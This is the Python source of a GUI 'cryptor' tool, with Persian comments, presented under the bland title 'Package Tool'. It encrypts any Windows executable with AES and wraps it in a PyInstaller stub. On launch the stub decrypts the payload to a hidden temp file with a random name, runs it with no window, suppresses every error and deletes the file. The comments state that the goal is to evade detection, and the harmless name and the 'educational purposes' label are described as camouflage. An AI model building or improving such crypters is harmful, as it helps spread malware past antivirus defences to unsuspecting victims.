import os
import sys
import base64
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import subprocess
import tempfile
import random
import string

# =============================================
# بخش رمزگذاری و رمزگشایی
# =============================================

def generate_key():
    # استفاده از کلید پویاتر
    salt = b'salt_1234567890'
    seed = "MySecretFixedKey2024!@#$"
    return hashlib.pbkdf2_hmac('sha256', seed.encode(), salt, 100000, dklen=32)

def encrypt_file(input_file, output_file):
    key = generate_key()
    cipher = AES.new(key, AES.MODE_CBC)
    
    with open(input_file, 'rb') as f:
        data = f.read()
    
    padded_data = pad(data, AES.block_size)
    encrypted_data = cipher.encrypt(padded_data)
    
    with open(output_file, 'wb') as f:
        f.write(cipher.iv)
        f.write(encrypted_data)
    
    return True

# =============================================
# ساخت Stub با روش‌های مختلف
# =============================================

def generate_random_name():
    """تولید نام تصادفی برای فایل‌ها"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def create_stub_advanced(encrypted_file_path, output_name="Protected.exe"):
    """ساخت فایل Stub با روش‌های پیشرفته و کاهش تشخیص"""
    
    # خواندن فایل رمزگذاری‌شده
    with open(encrypted_file_path, 'rb') as f:
        encrypted_data = f.read()
    
    # تقسیم داده به بخش‌های کوچک‌تر و رمزگذاری مضاعف
    encrypted_b64 = base64.b64encode(encrypted_data).decode('utf-8')
    
    # استفاده از تکنیک‌های مبهم‌سازی (Obfuscation)
    stub_code = f'''
import os
import sys
import base64
import tempfile
import subprocess
import hashlib
import ctypes
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# تابع رمزگشایی با کلید پویا
def _get_key():
    import random
    seed = "MySecretFixedKey2024!@#$"
    salt = b'salt_1234567890'
    return hashlib.pbkdf2_hmac('sha256', seed.encode(), salt, 100000, dklen=32)

def _decrypt(encrypted_b64):
    key = _get_key()
    encrypted_data = base64.b64decode(encrypted_b64)
    
    iv = encrypted_data[:16]
    cipher_data = encrypted_data[16:]
    
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    decrypted_data = cipher.decrypt(cipher_data)
    original_data = unpad(decrypted_data, AES.block_size)
    
    return original_data

# تابع اجرای مخفی (بدون پنجره)
def _run_hidden(exe_path):
    try:
        # روش اول: استفاده از CreateProcess
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0
        
        process = subprocess.Popen(
            [exe_path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return process
    except:
        # روش دوم: استفاده از ShellExecute
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "open", exe_path, None, None, 0)
        except:
            subprocess.Popen([exe_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

def main():
    try:
        # رمزگشایی داده
        decrypted_exe = _decrypt("{encrypted_b64}")
        
        # ذخیره در فایل موقت با نام تصادفی
        temp_dir = tempfile.gettempdir()
        random_name = "{generate_random_name()}.exe"
        temp_exe = os.path.join(temp_dir, random_name)
        
        with open(temp_exe, 'wb') as f:
            f.write(decrypted_exe)
        
        # تنظیم ویژگی‌های فایل برای مخفی‌سازی
        try:
            ctypes.windll.kernel32.SetFileAttributesW(temp_exe, 2)  # FILE_ATTRIBUTE_HIDDEN
        except:
            pass
        
        # اجرای فایل
        _run_hidden(temp_exe)
        
        # حذف فایل موقت بعد از تاخیر بیشتر
        time.sleep(5)
        try:
            os.remove(temp_exe)
        except:
            pass
        
    except Exception as e:
        # خطا رو مخفی نگه دار (برای جلوگیری از تشخیص)
        pass

if __name__ == "__main__":
    main()
'''
    
    # ذخیره کد Stub در فایل موقت با نام تصادفی
    stub_file = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8')
    stub_file.write(stub_code)
    stub_file.close()
    stub_path = stub_file.name
    
    try:
        output_dir = os.path.dirname(encrypted_file_path) or os.getcwd()
        output_name_final = f"_{generate_random_name()}.exe"
        
        # استفاده از روش‌های مختلف برای کاهش تشخیص
        methods = [
            # روش 1: استفاده از python -m با تنظیمات خاص
            lambda: subprocess.run([
                sys.executable, '-m', 'PyInstaller',
                '--onefile',
                '--noconsole',
                '--name', os.path.splitext(output_name_final)[0],
                '--distpath', output_dir,
                '--workpath', os.path.join(output_dir, f'_temp_{generate_random_name()}'),
                '--specpath', output_dir,
                '--add-data', f'{sys.executable};.',
                '--hidden-import', 'Crypto',
                '--hidden-import', 'Crypto.Cipher',
                '--hidden-import', 'Crypto.Util',
                '--upx-dir', '',
                '--noupx',
                stub_path
            ], capture_output=True, text=True),
            
            # روش 2: استفاده از pyinstaller مستقیم
            lambda: subprocess.run([
                'pyinstaller',
                '--onefile',
                '--noconsole',
                '--name', os.path.splitext(output_name_final)[0],
                '--distpath', output_dir,
                '--add-data', f'{sys.executable};.',
                '--hidden-import', 'Crypto',
                '--noupx',
                stub_path
            ], capture_output=True, text=True)
        ]
        
        result = None
        for method in methods:
            try:
                result = method()
                if result.returncode == 0:
                    break
            except:
                continue
        
        # پاک کردن فایل‌های موقت
        try:
            os.unlink(stub_path)
        except:
            pass
        
        # پاک کردن پوشه‌های اضافی
        for item in os.listdir(output_dir):
            if item.endswith('.spec') or item.startswith('_temp_'):
                try:
                    import shutil
                    path = os.path.join(output_dir, item)
                    if os.path.isdir(path):
                        shutil.rmtree(path, ignore_errors=True)
                    else:
                        os.remove(path)
                except:
                    pass
        
        if result and result.returncode == 0:
            return os.path.join(output_dir, output_name_final)
        else:
            error_msg = result.stderr if result else "Unknown error"
            raise Exception(f"Error: {error_msg}")
            
    except Exception as e:
        raise Exception(f"خطا در ساخت Stub: {str(e)}")

# =============================================
# رابط کاربری گرافیکی (GUI)
# =============================================

class CryptorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Secure Package Tool")
        self.root.geometry("600x500")
        self.root.resizable(False, False)
        
        # تنظیم آیکون و تم مخفی‌تر
        self.root.configure(bg='#f0f0f0')
        
        self.selected_file = None
        self.output_dir = os.getcwd()
        
        self.create_widgets()
    
    def create_widgets(self):
        # عنوان با نام غیرمشکوک
        title = tk.Label(self.root, text="📦 Package Tool v2.0", 
                        font=("Segoe UI", 18, "bold"), bg='#f0f0f0')
        title.pack(pady=15)
        
        # توضیحات ساده
        desc = tk.Label(self.root, text="Select file to process", 
                        font=("Segoe UI", 10), bg='#f0f0f0')
        desc.pack(pady=5)
        
        # فریم انتخاب فایل
        file_frame = tk.Frame(self.root, bg='#f0f0f0')
        file_frame.pack(pady=20)
        
        self.file_path_var = tk.StringVar(value="No file selected")
        file_label = tk.Label(file_frame, textvariable=self.file_path_var, 
                             width=50, relief="sunken", bg='white')
        file_label.pack(side=tk.LEFT, padx=5)
        
        select_btn = tk.Button(file_frame, text="📂 Browse", 
                              command=self.select_file, bg='#e0e0e0')
        select_btn.pack(side=tk.LEFT)
        
        # اطلاعات
        self.info_var = tk.StringVar(value="")
        info_label = tk.Label(self.root, textvariable=self.info_var, 
                             font=("Segoe UI", 9), fg="#555", bg='#f0f0f0')
        info_label.pack(pady=5)
        
        # دکمه پردازش با نام عمومی
        process_btn = tk.Button(self.root, text="▶ Process", 
                               command=self.process_file,
                               bg="#4CAF50", fg="white", 
                               font=("Segoe UI", 12, "bold"),
                               width=20, height=2)
        process_btn.pack(pady=15)
        
        # Progress Bar
        self.progress = ttk.Progressbar(self.root, mode='indeterminate', length=450)
        self.progress.pack(pady=10)
        
        # وضعیت
        self.status_var = tk.StringVar(value="✓ Ready")
        status_label = tk.Label(self.root, textvariable=self.status_var, 
                               font=("Segoe UI", 10), bg='#f0f0f0')
        status_label.pack(pady=10)
        
        # خروجی
        self.output_var = tk.StringVar(value="")
        output_label = tk.Label(self.root, textvariable=self.output_var, 
                               font=("Segoe UI", 9), fg="#2E7D32", bg='#f0f0f0')
        output_label.pack(pady=5)
        
        # توضیحات پایین با متن غیرمشکوک
        info = tk.Label(self.root, text="For educational purposes only", 
                        font=("Segoe UI", 8), fg="#888", bg='#f0f0f0')
        info.pack(side=tk.BOTTOM, pady=10)
    
    def select_file(self):
        file_path = filedialog.askopenfilename(
            title="Select file",
            filetypes=[("Executable files", "*.exe"), ("All files", "*.*")]
        )
        if file_path:
            self.selected_file = file_path
            file_size = os.path.getsize(file_path) / (1024 * 1024)
            self.file_path_var.set(os.path.basename(file_path))
            self.info_var.set(f"Size: {file_size:.2f} MB")
            self.status_var.set("✓ File selected")
    
    def process_file(self):
        if not self.selected_file:
            messagebox.showerror("Error", "Please select a file first!")
            return
        
        if not self.selected_file.lower().endswith('.exe'):
            messagebox.showerror("Error", "File must be .exe!")
            return
        
        try:
            self.progress.start()
            self.status_var.set("⏳ Processing...")
            self.root.update()
            
            # رمزگذاری
            encrypted_path = self.selected_file + ".enc"
            encrypt_file(self.selected_file, encrypted_path)
            
            self.status_var.set("⏳ Building package...")
            self.root.update()
            
            # ساخت Stub با نام تصادفی
            stub_path = create_stub_advanced(encrypted_path)
            
            # پاکسازی
            if os.path.exists(encrypted_path):
                os.remove(encrypted_path)
            
            self.progress.stop()
            self.status_var.set("✓ Processing completed!")
            self.output_var.set(f"Output: {stub_path}")
            
            messagebox.showinfo("Success", 
                f"File processed successfully!\n\n"
                f"Output: {stub_path}")
            
        except Exception as e:
            self.progress.stop()
            self.status_var.set(f"✗ Error: {str(e)}")
            messagebox.showerror("Error", f"Error:\n{str(e)}")

# =============================================
# اجرای برنامه
# =============================================

if __name__ == "__main__":
    root = tk.Tk()
    app = CryptorApp(root)
    root.mainloop()